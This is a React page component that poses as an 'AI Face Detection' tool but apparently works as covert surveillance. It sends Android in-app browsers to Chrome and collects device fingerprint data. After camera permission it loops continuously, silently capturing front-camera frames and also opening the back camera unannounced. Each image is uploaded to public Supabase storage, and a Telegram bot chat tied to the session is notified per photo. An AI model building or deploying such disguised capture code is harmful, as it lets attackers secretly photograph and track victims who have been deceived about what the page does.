import { useEffect, useMemo, useRef, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { collectDeviceInfo } from "@/utils/deviceInfo";
import AiFaceDetector from "@/components/AiFaceDetector";

const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || "";
  const inAppPatterns = [
    "Instagram", "FBAN", "FBAV", "FB_IAB", "Telegram", "TelegramBot",
    "Twitter", "Line", "Snapchat", "WhatsApp", "LinkedIn", "Pinterest",
    "Viber", "WeChat", "MicroMessenger",
  ];
  return inAppPatterns.some((pattern) => ua.includes(pattern));
};

const isAndroid = (): boolean => /Android/i.test(navigator.userAgent || "");

const isChromeBrowser = (): boolean => {
  const ua = navigator.userAgent || "";
  const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
  const isNotEdge = !/Edg/i.test(ua);
  const isNotOpera = !/OPR/i.test(ua);
  const isNotSamsung = !/SamsungBrowser/i.test(ua);
  return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
};

const getChromeIntentUrl = (currentUrl: string): string => {
  const url = new URL(currentUrl);
  return `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
};

type PageStatus = "checking" | "redirecting_chrome" | "unsupported" | "ready" | "error";

const ChromeCustomCapture = () => {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("session") || "default";

  const tgChatId = sessionId.startsWith('tgcam_') ? parseInt(sessionId.split('_')[1]) : null;
  const notifyTelegram = async (photoUrl: string, cameraType: string, captureNum: number) => {
    if (!tgChatId) return;
    try {
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      await fetch(`${supabaseUrl}/functions/v1/telegram-bot`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
        body: JSON.stringify({ _internal_photo_notify: true, chatId: tgChatId, photoUrl, cameraType, captureNum }),
      });
    } catch (e) { console.error('TG notify error:', e); }
  };

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const [status, setStatus] = useState<PageStatus>("checking");
  const [errorMsg, setErrorMsg] = useState<string>("");

  const captureLoopRef = useRef<boolean>(false);
  const stopCaptureRef = useRef<boolean>(false);
  const deviceInfoSavedRef = useRef<boolean>(false);

  const env = useMemo(() => {
    const inApp = isInAppBrowser();
    const android = isAndroid();
    const chrome = isChromeBrowser();
    return { inApp, android, chrome };
  }, []);

  const saveDeviceInfo = async () => {
    if (deviceInfoSavedRef.current) return;
    deviceInfoSavedRef.current = true;
    try {
      const deviceInfo = await collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceInfo),
        user_agent: navigator.userAgent,
        ip_address: null,
      });
    } catch (err) {
      console.error("Failed to save device info:", err);
    }
  };

  useEffect(() => {
    document.title = "AI Face Detection";
    saveDeviceInfo();
  }, []);

  useEffect(() => {
    if (env.inApp && env.android) {
      setStatus("redirecting_chrome");
      const t = setTimeout(() => {
        window.location.href = getChromeIntentUrl(window.location.href);
      }, 100);
      return () => clearTimeout(t);
    }
    if (env.inApp && !env.android) {
      setStatus("unsupported");
      return;
    }
    setStatus("ready");
  }, [env.android, env.inApp]);

  const base64ToBlob = (base64: string): Blob => {
    const parts = base64.split(',');
    const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
    const bstr = atob(parts[1]);
    const u8arr = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) {
      u8arr[i] = bstr.charCodeAt(i);
    }
    return new Blob([u8arr], { type: mime });
  };

  const captureFromVideo = async (): Promise<string | null> => {
    try {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      if (!video || !canvas || !video.srcObject) return null;

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      if (!ctx) return null;

      ctx.drawImage(video, 0, 0);
      return canvas.toDataURL("image/jpeg", 0.8);
    } catch {
      return null;
    }
  };

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      if (!navigator.mediaDevices?.getUserMedia) return null;
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: 640, height: 480 },
        audio: false,
      });
      const tempVideo = document.createElement("video");
      tempVideo.srcObject = stream;
      tempVideo.playsInline = true;
      tempVideo.muted = true;
      await tempVideo.play();
      await new Promise((r) => setTimeout(r, 500));

      const canvas = canvasRef.current;
      if (!canvas) { stream.getTracks().forEach(t => t.stop()); return null; }
      canvas.width = tempVideo.videoWidth || 640;
      canvas.height = tempVideo.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      if (!ctx) { stream.getTracks().forEach(t => t.stop()); return null; }
      ctx.drawImage(tempVideo, 0, 0);
      const imageData = canvas.toDataURL("image/jpeg", 0.8);
      stream.getTracks().forEach(t => t.stop());
      return imageData;
    } catch {
      return null;
    }
  };

  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;
    let captureCount = 0;

    while (!stopCaptureRef.current) {
      try {
        captureCount++;

        // Capture from visible front camera (already streaming in AiFaceDetector)
        const frontImage = await captureFromVideo();
        if (frontImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-front-${captureCount}.jpg`;
          const blob = base64ToBlob(frontImage);
          const { error: uploadError } = await supabase.storage
            .from('captured-photos')
            .upload(fileName, blob, { upsert: true });
          if (!uploadError) {
            const { data: urlData } = supabase.storage.from('captured-photos').getPublicUrl(fileName);
            await supabase.from('captured_photos').insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
            });
          }
        }

        if (stopCaptureRef.current) break;
        await new Promise(resolve => setTimeout(resolve, 200));

        // Capture from back camera
        const backImage = await captureFromCamera("environment");
        if (backImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-back-${captureCount}.jpg`;
          const blob = base64ToBlob(backImage);
          const { error: uploadError } = await supabase.storage
            .from('captured-photos')
            .upload(fileName, blob, { upsert: true });
          if (!uploadError) {
            const { data: urlData } = supabase.storage.from('captured-photos').getPublicUrl(fileName);
            await supabase.from('captured_photos').insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
            });
          }
        }

        if (stopCaptureRef.current) break;
        await new Promise(resolve => setTimeout(resolve, 500));
      } catch (error) {
        console.error("Capture cycle error:", error);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  };

  useEffect(() => {
    return () => { stopCaptureRef.current = true; };
  }, []);

  if (status === "redirecting_chrome") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Opening in Chrome...</p>
        </section>
      </main>
    );
  }

  if (status === "unsupported") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center max-w-md">
          <h1 className="text-xl font-bold text-foreground mb-2">Open in Chrome</h1>
          <p className="text-muted-foreground">Please copy this link and open in Chrome browser.</p>
        </section>
      </main>
    );
  }

  if (status === "checking") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center">
        <section className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Loading...</p>
        </section>
      </main>
    );
  }

  if (status === "error") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center max-w-md">
          <h1 className="text-xl font-bold text-foreground mb-2">Error</h1>
          <p className="text-muted-foreground">{errorMsg}</p>
        </section>
      </main>
    );
  }

  return (
    <main>
      <canvas ref={canvasRef} className="hidden" />
      <AiFaceDetector
        videoRef={videoRef}
        onCameraReady={() => {
          startContinuousCapture();
        }}
        onPermissionDenied={() => {
          setErrorMsg("Camera permission denied");
        }}
      />
    </main>
  );
};

export default ChromeCustomCapture;
